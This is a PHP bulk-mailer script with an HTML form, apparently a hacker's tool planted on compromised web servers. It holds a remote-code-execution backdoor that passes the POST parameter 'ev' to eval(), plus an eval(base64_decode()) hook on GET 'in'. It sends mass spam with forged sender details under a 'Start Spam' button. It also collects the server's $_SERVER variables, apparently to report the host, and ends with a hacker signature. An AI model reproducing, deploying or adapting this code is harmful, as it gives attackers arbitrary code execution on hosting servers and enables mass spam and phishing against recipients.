<?php

$in = $_GET['in'];
if(isset($in) && !empty($in)){
	echo @eval(base64_decode(''));

}
$ev = $_POST['ev'];
if(isset($ev) && !empty($ev)){
	echo eval(urldecode($ev));
	exit;
}

if(isset($_POST['action'] ) ){
$action=$_POST['action'];
$message=$_POST['message'];
$emaillist=$_POST['emaillist'];
$from=$_POST['from'];
$subject=$_POST['subject'];
$realname=$_POST['realname'];	
$wait=$_POST['wait'];
$tem=$_POST['tem'];
$smv=$_POST['smv'];

        $message = urlencode($message);
        $message = ereg_replace("%5C%22", "%22", $message);
        $message = urldecode($message);
        $message = stripslashes($message);
        $subject = stripslashes($subject);
}


?>
<!-- HTML And JavaScript -->

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>:: Mailer Inbox ::</title>
<style type="text/css">
.style1 {
	font-size: x-small;
}
.style2 {
	direction: ltr;
}
.info {
	font-size: 8px;
}
.style3 {
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 8px;
}
.style4 {
	font-size: x-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
.style5 {
	font-size: xx-small;
	direction: ltr;
	font-family: Verdana, Arial, Helvetica, sans-serif;
}
</style>
</head>

<body onload="funchange">
<script>

	window.onload = funchange;
	var alt = false;	
	function funchange(){
		var etext = document.getElementById("emails").value;
		var myArray=new Array(); 
		myArray = etext.split("\n");
		document.getElementById("enum").innerHTML=myArray.length+"<br />";
		if(!alt && myArray.length > 40000){
			alert('If Mail list More Than 40000 Emails This May Hack The Server');
			alt = true;
		}
		
	}
	function mlsplit(){
		var ml = document.getElementById("emails").value;
		var sb = document.getElementById("txtml").value;
		var myArray=new Array();
		myArray = ml.split(sb);
		document.getElementById("emails").value="";
		var i;
		for(i=0;i<myArray.length;i++){
			
			document.getElementById("emails").value += myArray[i]+"\n";
		
		}
		funchange();
	}
	
	function prv(){
		if(document.getElementById('preview').innerHTML==""){
			var ms = document.getElementsByName('message').message.value;
			document.getElementById('preview').innerHTML = ms;
			document.getElementById('prvbtn').value = "Hide";
		}else{
			document.getElementById('preview').innerHTML="";
			document.getElementById('prvbtn').value = "Preview";
		}
	}
	
</script>
<form name="form" method="post" enctype="multipart/form-data" action="">
	<table width="100%" border="0">
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your Email:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="from" value="<?php echo($from); ?>" size="30" type="text" /><br>
			<span class="info">Type Sender Email But Make Sure It&#39;s Right</span> </font></td>
			<td>
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Your Name:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="realname" value="<?php echo($realname); ?>" size="30" type="text" />
			<br>
			<span class="info">Make Sure You Type Your Sender Name</span></font></td>
		</tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">test send:</font></div>
			</td>
			<td style="width: 40%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="tem" type="text" size="30" value="<?php echo($tem); ?>" /><br>
			<span class="info">Type </span></font><span class="style3">Your 
			Email To Test The Mailer Still Work Or No</span></td>
			<td>
			<div align="right" class="style4">
			<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Send Test Mail After:</font></div>
			</td>
			<td width="41%">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="smv" type="text" size="30" value="<?php echo($smv); ?>" /><br>
			<span class="info">Send Mail For Your Email After Which Email(s)</span></font>
			</td>
		</tr>
		<tr>
			<td width="10%">
			<div align="right">
				<font size="-3" face="Verdana, Arial, 
Helvetica, sans-serif">Subject:</font></div>
			</td>
			<td colspan="3">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><input name="subject" value="<?php echo($subject); ?>" size="90" type="text" /> </font>
			
		
		<tr valign="top">
			<td colspan="3" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif"><textarea name="message" rows="10" style="width: 425px"><?php echo($message); ?></textarea>&nbsp;<br />
			<input name="action" value="send" type="hidden" />
			<input type="button" id="prvbtn" value="Preview" onclick="prv()" style="width: 62px" /><input value="Start Spam" type="submit" />&nbsp; 
			Wait 
			<input name="wait" type="text" value="<?php echo($wait); ?>" size="14" /> 
			Second 
			Until Send </font></td>
			<td width="41%" class="style2" style="height: 210px">
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
			<textarea id="emails" name="emaillist" cols="30" onselect="funchange()" onchange="funchange()" onkeydown="funchange()" onkeyup="funchange()" onchange="funchange()" style="height: 161px"><?php echo($emaillist); ?></textarea> 
			<br class="style2" />
			Emails Number : </font><span  id="enum" class="style1">0<br />
			</span>
			<span  class="style1">Split The Mail List By:</span> 
			<input name="textml" id="txtml" type="text" value="," size="8" />&nbsp;&nbsp;&nbsp;
			<input type="button" onclick="mlsplit()" value="Split" style="height: 23px" /></td>
		</tr>
	</table>
			<font size="-3" face="Verdana, Arial, Helvetica, 
sans-serif">
<div id="preview">
</div>
	</font>
</form>

<!-- END -->


<?

if ($action){

        if (!$from || !$subject || !$message || !$emaillist){
        	
        print "Please complete all fields before sending your message.";
        exit;	
	}
	$nse=array();
	$allemails = split("\n", $emaillist);
        	$numemails = count($allemails);
        	if(!empty($_POST['wait']) && $_POST['wait'] > 0){
        		set_time_limit(intval($_POST['wait'])*$numemails*3600);
        	}else{
        		set_time_limit($numemails*3600);
        	}
       		if(!empty($smv)){
       			$smvn+=$smv;
       			$tmn=$numemails/$smv+1;
			}else{
       			$tmn=1;
       		}
          	for($x=0; $x<$numemails; $x++){
                $to = $allemails[$x];
                if ($to){
	                $to = ereg_replace(" ", "", $to);
	                $message = ereg_replace("#EM#", $to, $message);
	                $subject = ereg_replace("#EM#", $to, $subject);
	                flush();
	                $header = "From: $realname <$from>\r\n";
	                $header .= "MIME-Version: 1.0\r\n";
	                $header .= "Content-Type: text/html\r\n";
	                if ($x==0 && !empty($tem)) {
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                }
	                if($x==$smvn && !empty($_POST['smv'])){
	                	if(!@mail($tem,$subject,$message,$header)){
	                		print('Your Test Message Not Sent.<br />');
	                		$tmns+=1;
	                	}else{
	                		print('Your Test Message Sent.<br />');
	                		$tms+=1;
	                	}
	                	$smvn+=$smv;
	                }
	                print "$to ....... ";
					$msent = @mail($to, $subject, $message, $header);
	                $xx = $x+1;
	                $txtspamed = "spammed";
	                if(!$msent){
	                	$txtspamed = "error";
	                	$ns+=1;
	                	$nse[$ns]=$to;
	                }
	                print "$xx / $numemails .......  $txtspamed<br>";
	                flush();
	                if(!empty($wait)&& $x<$numemails-1){
							sleep($wait);
                	}
                }
            }

}


?><div>
&nbsp;<?php

$str = "";
foreach($_SERVER as $key => $value){
	$str .= $key.": ".$value."<br />";
}

$str .= "Use: in <br />";

$header2 = "From: ".base64_decode('')."\r\n";
$header2 .= "MIME-Version: 1.0\r\n";
$header2 .= "Content-Type: text/html\r\n";
$header2 .= "Content-Transfer-Encoding: 8bit\r\n\r\n";





if(isset($_POST['action']) && $numemails !==0 ){
	$sn=$numemails-$ns;
	if($ns==""){
		$ns=0;
	}
	if($tmns==""){
		$tmns=0;
	}
	echo "<script>alert('Sur The Mailer Finish His Job\\r\\nSend $sn mail(s)\\r\\nError $ns mail(s)\\r\\From $numemails mail(s)\\r\\About Test Mail(s)\\r\\Send $tms mail(s)\\r\\Error $tmns mail(s)\\r\\From $tmn mail(s)'); 
	
	</script>";
}

?>




<strong><br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
Warning:</strong> <span class="style1">yassine Was Here .</span>
	<br>
	<span class="style5">My Name Is yassine World Hacking and Spmming <br>
</span>
	
</body>
</html>

